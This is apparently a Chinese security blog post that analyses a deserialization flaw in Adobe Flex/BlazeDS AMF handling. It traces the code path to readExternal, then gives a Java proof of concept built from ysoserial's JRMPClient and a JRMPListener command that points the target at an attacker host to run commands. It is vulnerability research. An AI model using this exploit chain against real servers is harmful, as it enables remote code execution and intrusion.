

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="flex反序列化">
<meta property="og:type" content="article">
<meta property="og:title" content="flex反序列化原理及利用链构造">
<meta property="og:url" content="http://novysodope.github.io/2022/05/30/105/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="flex反序列化">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/105/d5gsCsBhccCvMeXDmfpW5KkwJ8oFBLMZ8sN5FydOk4o.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/ak7hyWPlYWHVepuszhbhB4uk6_945G9JMzY86-uL0ls.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/Rg2h6T8Uisq62lR5MLqQxYqG1UoRVBQS4r4NQBvwfIk.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/nrtSKBENVxIxNwE2e1OelbIHiNHe180VSw46seEJALM.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/89UbW5_BSyiXVxQYYRqRijimqH-g_hvBGxJ-mWMDRYA.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/WQj_hNFS-RhwWuHgCRT6wnCKC8M4xmwjQ5Pf3PBv5I.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/mkLf80QJPhcBca2m2cTtdbXo1G9y-qUg3SmfZfsP1mU.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/w6FVNssxfyvj8DFaYjmzHHyvucNkqsqU8wvcxFcsxzU.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/VJ96U3NSmVd-9g2AZ8nx2nlDslo6qSMuKbEUVNYTXIY.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/UlY_FX7Udo00GKT9d-DR7uempHSkMG2PJLY-210R49M.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/56HnPr4d13CZ05R2PT9E5OtaBpxfJ_hyAo8TixUz8B0.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/j809tUtk32qMHg44v83GAnG6yW9Qa5OPNYhHGmlOGMo.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/mVE93JxCihVTest8E4Dg64ZMcLSrcFlutlx1EAWXeGk.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/hXznrm4Qek_Q5BKkP90J-OvMeduALt0OZa2lFzjqEFk.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/TDPPRcxmZe8OZVYqsjxtiiXdKDFSzJYLo6iNV9zuNN0.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/VJ6Awb20V7yqgsaNawv_FOLdfhvduVwQZRHoqBSnWTg.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/81885deOqQA7yi0iLxweQ12b2JIAU3XO-49rJj1iu0Q.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/5N5PEBsiGZJf4jP15RVSjdGhzU3SCD3GRQVrH5mXo6A.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/Hzl8-6Up1Mu1MPXTVqFRmN9rAaBQx0DPaJT097o3SbE.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/C479PFrvzPk9fheNbkOWzPKTH-nklYaPk35PSeqcQyc.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/4eHoOxMiQalRodhJ0BNtvYB7_feQzgooynge-Z6TyoE.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/1G8EVvtgM2BEz02TjWNTM_2t4a-8IPunlIiAFo9e0RQ.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/FjLKXguDpC-7n6uy3lxdRnhgTZTbdM0X94ndvtxvBM0.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/LxH9D4p9XwH1S5dPYGtEpbV49Qp1XgCU_Jv0liua-jc.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/Selgp_mnSTDJB3w8BzAhc6vN6ePYavFbNG53fjokGE0.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/r0otCl0kWrRT9NkxFZQskcpAak8BCraxXdKY_O_busM.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/d518ERlMnDoFyD2WJArLHO9ynpx7j18iEgGx43gqQjk.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/8QSEtbnqACETRaQlrvzPReGIS-U8fHWXgv08TbwmxkI.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/0uZY1QPuYAzBvvUOeQW5TKXyXa6qEOE56iYI3dt6AEI.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/cjNahKdGVfBokhvXz7zy50GMuCIvYAcu31clm35s_DE.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/neVtssTKOGuD6-SIRPNpYLo54BYxyBYHBOXNtowHcKc.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/hLD8-MFTrt561W6Gx3wYEfTBDP8MpITd5YtPXanfxWM.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/ejsHZgzi-oZrsQDnVS_D0eDUmyJmnTjgTAxJ0XRIB0.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/HsII9jFj6j5QOP5qTdb5amt5Vu2vQJvHMklAZQU5Cmc.png">
<meta property="og:image" content="http://novysodope.github.io/images/105/wfjgdK38fKyA5Ts7GDyJmFt0IwEgqANTStMI9ey5ZDM.png">
<meta property="article:published_time" content="2022-05-30T05:15:21.000Z">
<meta property="article:modified_time" content="2023-12-21T03:48:27.561Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/105/d5gsCsBhccCvMeXDmfpW5KkwJ8oFBLMZ8sN5FydOk4o.png">
  
  <title>flex反序列化原理及利用链构造 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="flex反序列化原理及利用链构造">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-05-30 13:15" pubdate>
        May 30, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.5k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      17 分钟
    </span>
  

  
  
    

      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">flex反序列化原理及利用链构造</h1>
            
            <div class="markdown-body">
              <p><code>WEB-INF\web.xml</code></p>
<p>MessageBrokerServlet类处理<code>/messagebroker/*</code>请求</p>
<p><img src="/images/105/d5gsCsBhccCvMeXDmfpW5KkwJ8oFBLMZ8sN5FydOk4o.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在<code>MessageBrokerServlet</code>的<code>service</code>方法中，先将<code>HttpServletRequest</code>等对象存到<code>FlexContext</code>的变量<code>ThreadLocalObjects</code>中</p>
<p><img src="/images/105/ak7hyWPlYWHVepuszhbhB4uk6_945G9JMzY86-uL0ls.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>随后根据<code>endpointPath</code>去获取对应的<code>endpoint</code></p>
<p><img src="/images/105/Rg2h6T8Uisq62lR5MLqQxYqG1UoRVBQS4r4NQBvwfIk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/105/nrtSKBENVxIxNwE2e1OelbIHiNHe180VSw46seEJALM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>而<code>web.xml</code>已经指定过配置文件</p>
<p><img src="/images/105/89UbW5_BSyiXVxQYYRqRijimqH-g_hvBGxJ-mWMDRYA.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在配置文件中可以看到是由<code>AMFEndpoint</code>来处理<code>/messagebroker/amf</code>这个请求（<code>endpointPath</code>），即<code>endpointPath</code>的<code>endpoint</code>就是<code>AMFEndpoint</code>类</p>
<p><img src="/images/105/WQj_hNFS-RhwWuHgCRT6wnCKC8M4xmwjQ5Pf3PBv5I.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>回到<code>MessageBrokerServlet.class</code></p>
<p>在得到处理请求的类后就使用该类的<code>service</code>方法处理请求</p>
<p><img src="/images/105/mkLf80QJPhcBca2m2cTtdbXo1G9y-qUg3SmfZfsP1mU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在前面的代码中可以看到<code>endpoint</code>的对象类型是<code>Endpoint</code>，而<code>Endpoint</code>是一个接口，所以要找到该接口的实现类</p>
<p><img src="/images/105/w6FVNssxfyvj8DFaYjmzHHyvucNkqsqU8wvcxFcsxzU.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>所以实际就是<code>BaseHTTPEndpoint</code>的<code>service</code>方法来处理<code>/amf</code>请求</p>
<p>在<code>service</code>方法中，会交由<code>filterChain.invoke</code>处理上下文内容</p>
<p><img src="/images/105/VJ96U3NSmVd-9g2AZ8nx2nlDslo6qSMuKbEUVNYTXIY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>filterChain</code>：</p>
<p><img src="/images/105/UlY_FX7Udo00GKT9d-DR7uempHSkMG2PJLY-210R49M.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>createFilterChain</code>是一个抽象方法</p>
<p><img src="/images/105/56HnPr4d13CZ05R2PT9E5OtaBpxfJ_hyAo8TixUz8B0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>需要找到实现他的子类，即<code>AMFEndpoint</code></p>
<p><img src="/images/105/j809tUtk32qMHg44v83GAnG6yW9Qa5OPNYhHGmlOGMo.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>SerializationFilter</code>类查看<code>invoke</code>方法</p>
<p>其会获取输入流封装到<code>deserializer</code>对象</p>
<p><img src="/images/105/mVE93JxCihVTest8E4Dg64ZMcLSrcFlutlx1EAWXeGk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>具体可以看到<code>getHttpRequest</code>方法返回的内容就是之前存在<code>threadLocalObject</code>里的信息</p>
<p><img src="/images/105/hXznrm4Qek_Q5BKkP90J-OvMeduALt0OZa2lFzjqEFk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>initialize</code>方法：</p>
<p><img src="/images/105/TDPPRcxmZe8OZVYqsjxtiiXdKDFSzJYLo6iNV9zuNN0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>随后进入到<code>readMessage</code>处理上下文内容</p>
<p><img src="/images/105/VJ6Awb20V7yqgsaNawv_FOLdfhvduVwQZRHoqBSnWTg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在<code>readMessage</code>方法中，会执行三次<code>readUnsignedShort</code>方法分别获取<code>version</code>、<code>headersCount</code>和<code>bodyCount</code></p>
<p>漏洞触发主要在<code>bodyCount</code></p>
<p><img src="/images/105/81885deOqQA7yi0iLxweQ12b2JIAU3XO-49rJj1iu0Q.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>走到<code>readBody</code></p>
<p><img src="/images/105/5N5PEBsiGZJf4jP15RVSjdGhzU3SCD3GRQVrH5mXo6A.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>进入到<code>readObject</code>方法</p>
<p>因为之前初始化的时候赋值过，所以这的<code>amfIn</code>就是<code>Amf0Input</code>对象，即这里的<code>readObject</code>其实是<code>Amf0Input</code>的<code>readObject</code></p>
<p><img src="/images/105/Hzl8-6Up1Mu1MPXTVqFRmN9rAaBQx0DPaJT097o3SbE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>Amf0Input</code>查看<code>readObject</code>方法，该方法会先读取传入的数据字节，然后根据不同的属性进入对应的方法进行处理</p>
<p><img src="/images/105/C479PFrvzPk9fheNbkOWzPKTH-nklYaPk35PSeqcQyc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>查看<code>readObjectValue</code></p>
<p>已知<code>type</code>是<code>amfIn.readUnsignedShort</code> 获取得来，<code>type</code>是<code>2</code>字节，这里会首先读取<code>1</code>字节，当读取的值是<code>17</code>时（序列化时写入）就会再初始化一次<code>avmPlusInput</code>，并进入到<code>readObject</code>方法</p>
<p><img src="/images/105/4eHoOxMiQalRodhJ0BNtvYB7_feQzgooynge-Z6TyoE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在<code>readObject</code>方法中，再读取<code>1</code>字节</p>
<p><img src="/images/105/1G8EVvtgM2BEz02TjWNTM_2t4a-8IPunlIiAFo9e0RQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>readObjectValue</code>方法，当读到的值是<code>10</code>时（序列化时写入）就会进入到<code>readScriptObject</code>方法</p>
<p><img src="/images/105/FjLKXguDpC-7n6uy3lxdRnhgTZTbdM0X94ndvtxvBM0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在<code>readScriptObject</code>方法中，会根据传入的类名返回一个对象</p>
<p><img src="/images/105/LxH9D4p9XwH1S5dPYGtEpbV49Qp1XgCU_Jv0liua-jc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>getClassFromClassName</code>查看具体实现</p>
<p><img src="/images/105/Selgp_mnSTDJB3w8BzAhc6vN6ePYavFbNG53fjokGE0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>createClass</code>方法会返回一个初始化的对象</p>
<p><img src="/images/105/r0otCl0kWrRT9NkxFZQskcpAak8BCraxXdKY_O_busM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>然后会将对象传进<code>getProxyAndRegister</code>方法查找对应的属性代理，用于处理对象的属性读写，如果注册表中存在，则传进<code>createDefaultInstance</code>方法实例化对象</p>
<p><img src="/images/105/d518ERlMnDoFyD2WJArLHO9ynpx7j18iEgGx43gqQjk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>然而注册表里只有几个异常和Map对象</p>
<p>具体可以看<code>getRegistry</code>方法：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> preregistered = <span class="hljs-keyword">false</span>;<br><br>...<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PropertyProxyRegistry <span class="hljs-title">getRegistry</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!preregistered) &#123;<br>            preRegister();<br>            preregistered = <span class="hljs-keyword">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> registry;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">preRegister</span><span class="hljs-params">()</span> </span>&#123;<br>        ThrowableProxy proxy = <span class="hljs-keyword">new</span> ThrowableProxy();<br>        registry.register(MessageException.class, proxy);<br>        registry.register(LocalizedException.class, proxy);<br>        registry.register(Throwable.class, proxy);<br>        MapProxy mapProxy = <span class="hljs-keyword">new</span> MapProxy();<br>        registry.register(ASObject.class, mapProxy);<br>        registry.register(HashMap.class, mapProxy);<br>        registry.register(AbstractMap.class, mapProxy);<br>        registry.register(Map.class, mapProxy);<br>    &#125;<br></code></pre></div></td></tr></table></figure>
<p>所以流程会将对象传入<code>createInstance</code>方法进行实例化</p>
<p><img src="/images/105/8QSEtbnqACETRaQlrvzPReGIS-U8fHWXgv08TbwmxkI.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>createInstance</code>实际还是会调用到<code>getClassFromClassName</code>来返回一个对象</p>
<p><img src="/images/105/0uZY1QPuYAzBvvUOeQW5TKXyXa6qEOE56iYI3dt6AEI.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>createInstanceFromClassName</code>方法：</p>
<p><img src="/images/105/cjNahKdGVfBokhvXz7zy50GMuCIvYAcu31clm35s_DE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>在获得一个实例化对象后，会判断该对象是否实现了<code>Externalizable</code>接口，如果实现了则进入<code>readExternalizable</code>方法，在该方法里使用<code>readExternal</code>方法进行反序列化，漏洞在此触发</p>
<p><img src="/images/105/neVtssTKOGuD6-SIRPNpYLo54BYxyBYHBOXNtowHcKc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>按照流程，想要利用这一步的反序列化，需要找一个实现了<code>Externalizable</code>接口且有公共无参构造函数的利用链，比如<code>sun.rmi.server.UnicastRef</code></p>
<p><img src="/images/105/hLD8-MFTrt561W6Gx3wYEfTBDP8MpITd5YtPXanfxWM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/105/ejsHZgzi-oZrsQDnVS_D0eDUmyJmnTjgTAxJ0XRIB0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>改一下<code>ysoserial</code>的<code>JRMPClient</code>即可得到一个POC：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> flex.messaging.io.SerializationContext;<br><span class="hljs-keyword">import</span> flex.messaging.io.amf.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Gadgets;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br> <br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.math.BigInteger;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span>:novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span>:13:44 2022/5/30</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Version</span> 1.0</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AMFEXPLoit</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Object object = GetObject(<span class="hljs-string">&quot;192.168.31.169&quot;</span>,<span class="hljs-number">1234</span>);<span class="hljs-comment">//JRMP启动地址、端口</span><br> <br>        <span class="hljs-comment">// 序列化对象，生成AMF Message对象</span><br>        <span class="hljs-keyword">byte</span>[] amf = serialize(object);<br>        System.out.println(<span class="hljs-string">&quot;序列化：&quot;</span> + amf);<br> <br>        <span class="hljs-comment">// 反序列化对象</span><br>        ActionMessage actionMessage = deserialize(amf);<br>        System.out.println(<span class="hljs-string">&quot;反序列化：&quot;</span> + actionMessage);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">GetObject</span><span class="hljs-params">(String host,<span class="hljs-keyword">int</span> port)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>         ObjID id = <span class="hljs-keyword">new</span> ObjID(<span class="hljs-keyword">new</span> Random().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        TCPEndpoint te = <span class="hljs-keyword">new</span> TCPEndpoint(host, port);<br>        UnicastRef ref = <span class="hljs-keyword">new</span> UnicastRef(<span class="hljs-keyword">new</span> LiveRef(id, te, <span class="hljs-keyword">false</span>));<br>        <span class="hljs-keyword">return</span> ref;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serialize(Object data) <span class="hljs-keyword">throws</span> IOException &#123;<br>        MessageBody body = <span class="hljs-keyword">new</span> MessageBody();<br>        body.setData(data);<br>        ActionMessage message = <span class="hljs-keyword">new</span> ActionMessage();<br>        message.addBody(body);<br>        ByteArrayOutputStream out = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        AmfMessageSerializer serializer = <span class="hljs-keyword">new</span> AmfMessageSerializer();<br>        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="hljs-keyword">null</span>);<br>        serializer.writeMessage(message);<br>        <span class="hljs-keyword">return</span> out.toByteArray();<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ActionMessage <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] amf)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException </span>&#123;<br>        ByteArrayInputStream in = <span class="hljs-keyword">new</span> ByteArrayInputStream(amf);<br>        AmfMessageDeserializer deserializer = <span class="hljs-keyword">new</span> AmfMessageDeserializer();<br>        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="hljs-keyword">null</span>);<br>        ActionMessage actionMessage = <span class="hljs-keyword">new</span> ActionMessage();<br>        deserializer.readMessage(actionMessage, <span class="hljs-keyword">new</span> ActionContext());<br>        <span class="hljs-keyword">return</span> actionMessage;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>服务器启动JRMP，运行POC</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java -cp ysoserial-<span class="hljs-number">1.0</span>.jar ysoserial.exploit.JRMPListener <span class="hljs-number">1234</span> ROME <span class="hljs-string">&quot;calc&quot;</span><br></code></pre></div></td></tr></table></figure>
<p><img src="/images/105/HsII9jFj6j5QOP5qTdb5amt5Vu2vQJvHMklAZQU5Cmc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
